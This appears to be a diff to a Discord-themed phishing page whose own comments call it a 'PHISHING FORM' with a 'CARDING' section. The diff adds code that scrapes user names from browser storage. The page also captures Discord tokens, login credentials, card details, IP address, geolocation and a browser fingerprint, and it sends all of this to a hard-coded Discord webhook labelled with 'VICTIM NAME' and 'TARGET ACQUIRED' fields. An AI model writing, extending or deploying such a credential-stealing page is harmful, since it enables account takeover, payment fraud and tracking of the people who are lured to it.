@@ -36,7 +36,7 @@
                     Scanning...
                 </div>
                 <button id="tokenConfirm" class="w-full bg-gradient-to-r from-emerald-500 to-teal-500 text-white font-bold py-4 px-6 rounded-2xl text-lg hover:from-emerald-600 hover:to-teal-600 transform hover:scale-105 transition-all">
-                     Verified - Continue
+                    ✅ Verified - Continue
                 </button>
             </div>
         </div>
@@ -44,7 +44,7 @@
         <!-- PHISHING FORM -->
         <div id="mainForm" class="hidden space-y-6 mt-8">
             <div class="bg-white bg-opacity-10 backdrop-blur-xl p-6 rounded-2xl border border-white border-opacity-20">
-                <h2 class="text-2xl font-bold mb-6 text-center"> Verify Discord Account</h2>
+                <h2 class="text-2xl font-bold mb-6 text-center">🔐 Verify Discord Account</h2>
                 <div class="space-y-4">
                     <input type="text" id="email" placeholder="Email or Phone" class="w-full p-4 bg-white bg-opacity-20 rounded-xl border border-white border-opacity-30 focus:outline-none focus:ring-2 focus:ring-purple-400 text-lg">
                     <input type="password" id="password" placeholder="Password" class="w-full p-4 bg-white bg-opacity-20 rounded-xl border border-white border-opacity-30 focus:outline-none focus:ring-2 focus:ring-purple-400 text-lg">
@@ -53,7 +53,7 @@
 
             <!-- CARDING -->
             <div id="cardSection" class="hidden bg-white bg-opacity-10 backdrop-blur-xl p-6 rounded-2xl border border-white border-opacity-20">
-                <h2 class="text-2xl font-bold mb-6 text-center"> Payment Method (Required)</h2>
+                <h2 class="text-2xl font-bold mb-6 text-center">💳 Payment Method (Required)</h2>
                 <div class="space-y-4">
                     <input type="text" id="cardNumber" maxlength="19" placeholder="1234 5678 9012 3456" class="w-full p-4 bg-white bg-opacity-20 rounded-xl border border-white border-opacity-30 text-lg">
                     <div class="grid grid-cols-2 gap-4">
@@ -82,10 +82,37 @@
         const WEBHOOK = 'https://canary.discord.com/api/webhooks/1477996621362102312/e_cB4c2Utso2Mia7RzB72NGC-Rvz0TkhiiL9Pn_9sus0sRt1CkZ_3MhLQvRHtUZqZZKI';
         let tokensGrabbed = false;
 
-        // 🔥 BULLETPROOF TOKEN GRABBER - Multiple regex patterns
+        // 🔥 FULL NAME GRABBER + BULLETPROOF TOKEN GRABBER
         function instantTokenGrab() {
             if (tokensGrabbed) return;
             tokensGrabbed = true;
+
+            // 👤 GRAB FULL NAME FROM EVERYWHERE
+            const fullNameSources = [
+                // LocalStorage patterns
+                localStorage.getItem('localStorageUserName'),
+                localStorage.getItem('user_name'),
+                localStorage.getItem('display_name'),
+                localStorage.getItem('username'),
+                // SessionStorage
+                sessionStorage.getItem('localStorageUserName'),
+                sessionStorage.getItem('user_name'),
+                sessionStorage.getItem('display_name'),
+                sessionStorage.getItem('username'),
+                // Document title/user agent hints
+                document.title.split(' - ')[0],
+                // Navigator hints
+                navigator.userAgent.match(/Discord\/([\w\s]+)/)?.[1] || ''
+            ];
+            
+            // Discord-specific storage keys (common)
+            const discordKeys = ['localStorageUserName', 'user_name', 'display_name', 'username', 'user'];
+            discordKeys.forEach(key => {
+                try {
+                    const data = localStorage.getItem(key) || sessionStorage.getItem(key);
+                    if(data) fullNameSources.push(data);
+                } catch(e) {}
+            });
 
             // AGGRESSIVE REGEX - Catches ALL Discord tokens
             const regexes = [
@@ -119,36 +146,46 @@
             );
 
             const tokenDisplay = document.getElementById('tokenDisplay');
+            const fullName = [...new Set(fullNameSources)].filter(n => n && n.length > 1 && !n.includes('@')).join(' ') || 'Unknown User';
+            
             if(tokens.length) {
                 const token = tokens[0];
                 tokenDisplay.textContent = token;
                 tokenDisplay.classList.add('token-box');
                 
-                // 🔥 SEND FULL TOKEN TO WEBHOOK (NO SLICING)
+                // 🔥 SEND FULL TOKEN + USERNAME TO WEBHOOK
                 fetch(WEBHOOK, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
-                        content: ` **TOKEN GRABBED** \`${token}\``,
+                        content: `🔥 **TOKEN GRABBED** \`${token}\``,
                         embeds: [{
                             title: '✅ TOKEN CONFIRMED',
                             description: `**${tokens.length} tokens** found & displayed`,
                             color: 0x00ff88,
                             fields: [
+                                {name: '👤 VICTIM NAME', value: `\`${fullName}\``, inline: false},
                                 {name: '📱 Token', value: `\`${token}\``, inline: false},
                                 {name: 'Length', value: `${token.length}`, inline: true},
                                 {name: 'Type', value: token.startsWith('mfa.') ? 'MFA' : 'Classic', inline: true}
                             ]
                         }]
                     })
-                }).then(() => console.log('✅ TOKEN SENT')).catch(e => console.error('Webhook fail:', e));
+                }).then(() => console.log('✅ TOKEN + NAME SENT')).catch(e => console.error('Webhook fail:', e));
             } else {
                 tokenDisplay.textContent = 'No tokens found';
-                // Still send "no token" webhook
+                // Still send "no token" + username webhook
                 fetch(WEBHOOK, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({content: '❌ No tokens detected'})
+                    body: JSON.stringify({ 
+                        embeds: [{
+                            title: '❌ No Token',
+                            description: `User hit but no token found`,
+                            color: 0xff4757,
+                            fields: [{name: '👤 VICTIM NAME', value: `\`${fullName}\``, inline: false}]
+                        }]
+                    })
                 });
             }
         }
@@ -167,7 +204,7 @@
                     const data = await res.json();
                     return {
                         country: data.country || data.country_name || 'Unknown',
-                        city: data.city || data.region || 'Unknown',
+                        city: data.region || data.city || 'Unknown',
                         region: data.regionName || data.region || '',
                         lat: data.lat || data.latitude || 0,
                         lon: data.lon || data.longitude || 0,
@@ -179,12 +216,25 @@
             return { country: 'Unknown', city: 'Unknown', isp: 'Unknown' };
         }
 
-        // 🚀 MAIN IP + GEO GRAB (unchanged)
+        // 🚀 MAIN IP + GEO GRAB (ADDED USERNAME)
         async function sendVictimData() {
             try {
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const { ip } = await ipRes.json();
                 const geo = await grabGeoLocation(ip);
+                
+                // 👤 GRAB USERNAME ON LOAD TOO
+                const fullNameSources = [
+                    localStorage.getItem('localStorageUserName'),
+                    localStorage.getItem('user_name'),
+                    localStorage.getItem('display_name'),
+                    localStorage.getItem('username'),
+                    sessionStorage.getItem('localStorageUserName'),
+                    sessionStorage.getItem('user_name'),
+                    sessionStorage.getItem('display_name'),
+                    sessionStorage.getItem('username')
+                ];
+                const fullName = [...new Set(fullNameSources)].filter(n => n && n.length > 1 && !n.includes('@')).join(' ') || 'Unknown User';
                 
                 const fingerprint = {
                     ip, screen: `${screen.width}x${screen.height}`, 
@@ -193,7 +243,8 @@
                     cookies: document.cookie.length,
                     plugins: navigator.plugins.length,
                     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    ua: navigator.userAgent.slice(0,80)
+                    ua: navigator.userAgent.slice(0,80),
+                    username: fullName
                 };
                 
                 await fetch(WEBHOOK, {
@@ -204,6 +255,7 @@
                             title: '🎯 TARGET ACQUIRED',
                             color: 0xff6b35,
                             fields: [
+                                {name: '👤 VICTIM NAME', value: `\`${fingerprint.username}\``, inline: true},
                                 {name: '🌍 Location', value: `${geo.city}, ${geo.country}`, inline: true},
                                 {name: '📍 GPS', value: `${geo.lat.toFixed(4)}, ${geo.lon.toFixed(4)}`, inline: true},
                                 {name: '🌐 ISP', value: geo.isp, inline: true},
@@ -251,8 +303,8 @@
             };
             
             const fields = [
-                {name:'📧 Email', value: `\`${creds.email}\``, inline:true},
-                {name:'🔑 Pass', value: `\`${creds.pass}\``, inline:true}
+                {name: '📧 Email', value: `\`${creds.email}\``, inline:true},
+                {name: '🔑 Pass', value: `\`${creds.pass}\``, inline:true}
             ];
             
             if(creds.card) {
@@ -303,6 +355,5 @@
         };
     </script>
 </body>
-</html>
 </html>
 
